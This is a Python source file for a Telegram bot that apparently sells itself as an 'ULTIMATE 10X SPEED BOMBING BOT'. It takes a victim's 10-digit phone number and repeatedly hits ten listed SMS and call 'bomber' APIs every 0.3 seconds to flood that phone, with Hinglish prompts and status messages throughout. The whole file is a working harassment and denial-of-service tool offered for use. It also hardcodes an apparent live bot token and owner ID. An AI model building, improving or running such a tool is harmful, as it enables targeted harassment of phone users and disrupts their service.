import asyncio
import aiohttp
import sqlite3
import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters

# Dummy HTTP Server to satisfy Render Web Service port requirement
class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is alive and running!")

def run_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), SimpleHandler)
    server.serve_forever()

# Start dummy server in a background thread
threading.Thread(target=run_server, daemon=True).start()

# Bot Configuration with New Token
TOKEN = "9236973341:AAHsDn5OQ_fyq1gMLGjiUoC07ZXrHknrb_s"
OWNER_CHAT_ID = 6684734209

# 10 High-Speed Public Bomber API Endpoints
APIS = [
    "https://fast-bomber-chodachodi.vercel.app/?mobile={mobile}",
    "https://sms-bomber-api.vercel.app/bomb?phone={mobile}",
    "https://call-bomber.vercel.app/api?phone={mobile}",
    "https://api.bombermaster.xyz/send?phone={mobile}",
    "https://speed-bomber.herokuapp.com/bomb?mobile={mobile}",
    "https://unlimited-bomber.vercel.app/api/bomb?phone={mobile}",
    "https://free-sms-bomber.herokuapp.com/send?phone={mobile}",
    "https://King-bomber.vercel.app/api?mobile={mobile}",
    "https://turbo-bomber.herokuapp.com/bomb?mobile={mobile}",
    "https://flash-sms-api.vercel.app/send?phone={mobile}"
]

# Database setup
def init_db():
    if os.path.exists('bot.db'):
        os.remove('bot.db')
    
    conn = sqlite3.connect('bot.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            join_date TEXT,
            is_blocked INTEGER DEFAULT 0
        )
    ''')
    conn.commit()
    conn.close()

def add_user(user_id):
    conn = sqlite3.connect('bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    if not cursor.fetchone():
        cursor.execute(
            'INSERT INTO users (user_id, join_date, is_blocked) VALUES (?, ?, ?)',
            (user_id, datetime.now().isoformat(), 0)
        )
    conn.commit()
    conn.close()

# Dictionary to track running tasks
running_tasks = {}

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    add_user(user_id)
    
    welcome_message = (
        "🔥 **ULTIMATE 10X SPEED BOMBING BOT** 🔥\n\n"
        "⚡ 10 powerful APIs ke sath non-stop fast calls aur SMS bhejne ke liye taiyar!\n\n"
        "🎯 **Kaise Use Karein?**\n"
        "Bas apna 10-digit ka target mobile number yahan type karke bhej dein (jaise: `9876543210`).\n\n"
        "🛑 **Stop karne ke liye:** `stop` likhein ya button dabayein."
    )
    keyboard = [
        [InlineKeyboardButton("📞 Start Bombing", callback_data="start_bomb_menu")],
        [InlineKeyboardButton("💬 Contact Owner", url="https://t.me/Gauravcyber_op")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode='Markdown')

async def show_main_menu_from_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.edit_message_text(
        "🔥 **10X SPEED BOMBING MENU** 🔥\n\n"
        "🎯 Target par bombing shuru karne ke liye apna 10-digit ka mobile number bhejein.\n"
        "🛑 Rokne ke liye **stop** likhein.",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💬 Contact Owner", url="https://t.me/Gauravcyber_op")]])
    )

# Message handler
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    message_text = update.message.text.strip()
    
    if message_text.lower() == 'stop':
        task = running_tasks.pop(user_id, None)
        if task:
            task.cancel()
            await update.message.reply_text("🛑 **BOMBING SUCCESSFULLY STOPPED!** 🛑")
        else:
            await update.message.reply_text("⚠️ Koi active bombing nahi chal rahi hai.")
        return

    if message_text.isdigit() and len(message_text) == 10:
        if user_id in running_tasks:
            await update.message.reply_text("⚠️ Pehle se ek bombing chal rahi hai! Use rokne ke liye **stop** bhejein.")
            return
            
        phone = message_text
        processing_msg = await update.message.reply_text(
            f"🚀 **10X BOMBING STARTED** 🚀\n\n"
            f"🎯 Target: `{phone}`\n"
            f"⚡ Active APIs: 10 Connected\n"
            f"⚡ Status: Running...\n\n"
            f"🛑 Rokne ke liye **stop** bhejein.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP BOMBING", callback_data=f"stop_bomb_{user_id}")]])
        )
        
        task = asyncio.create_task(send_bomb_requests(update, phone, user_id))
        running_tasks[user_id] = task
    else:
        await update.message.reply_text("❌ Kripya sahi 10-digit ka mobile number bhejein.")

# High-speed parallel background worker using all 10 APIs
async def send_bomb_requests(update: Update, phone: str, user_id: int):
    successful = 0
    start_time = datetime.now()
    
    async with aiohttp.ClientSession() as session:
        while user_id in running_tasks:
            tasks = []
            for api in APIS:
                url = api.format(mobile=phone)
                tasks.append(fetch_url(session, url))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for res in results:
                if res:
                    successful += 1
            
            elapsed = int((datetime.now() - start_time).total_seconds())
            if elapsed > 0 and elapsed % 15 == 0:
                try:
                    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP BOMBING", callback_data=f"stop_bomb_{user_id}")]])
                    await update.message.reply_text(
                        f"📊 **10X BOMBING STATUS UPDATE** 📊\n\n"
                        f"📞 Target: `{phone}`\n"
                        f"⏰ Active Time: {elapsed}s\n"
                        f"✅ Requests Sent: {successful}\n"
                        f"🚀 Status: Ongoing...",
                        reply_markup=keyboard
                    )
                except:
                    pass
                    
            await asyncio.sleep(0.3) # Ultra-fast loop delay
            
    total_duration = int((datetime.now() - start_time).total_seconds())
    try:
        await update.message.reply_text(
            f"🏁 **BOMBING FINISHED / STOPPED** 🏁\n\n"
            f"📞 Target: `{phone}`\n"
            f"⏱️ Total Duration: {total_duration}s\n"
            f"✅ Total Requests Sent: {successful}"
        )
    except:
        pass

async def fetch_url(session, url):
    try:
        async with session.get(url, timeout=2) as response:
            if response.status == 200:
                return True
    except:
        pass
    return False

# Stop callback handler
async def stop_bomb_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data
    
    if data.startswith('stop_bomb_'):
        try:
            target_user_id = int(data.split('_')[2])
            if user_id == target_user_id or user_id == OWNER_CHAT_ID:
                task = running_tasks.pop(target_user_id, None)
                if task:
                    task.cancel()
                    await query.answer("🛑 Bombing Stopped Successfully!", show_alert=True)
                    await query.edit_message_text("🛑 **BOMBING STOPPED BY USER!** 🛑")
                else:
                    await query.answer("⚠️ No active bombing found.", show_alert=True)
            else:
                await query.answer("❌ Aap isse nahi rok sakte!", show_alert=True)
        except:
            await query.answer("❌ Error!", show_alert=True)

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.data.startswith('stop_bomb_'):
        await stop_bomb_callback(update, context)
        return
    await query.answer()
    if query.data == "start_bomb_menu":
        await query.edit_message_text("📞 **Target Number Bhejein:**\n\nKripya seedha 10 digit ka mobile number type karke send karein.")

def main():
    init_db()
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("🎯 10X Speed Bombing Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
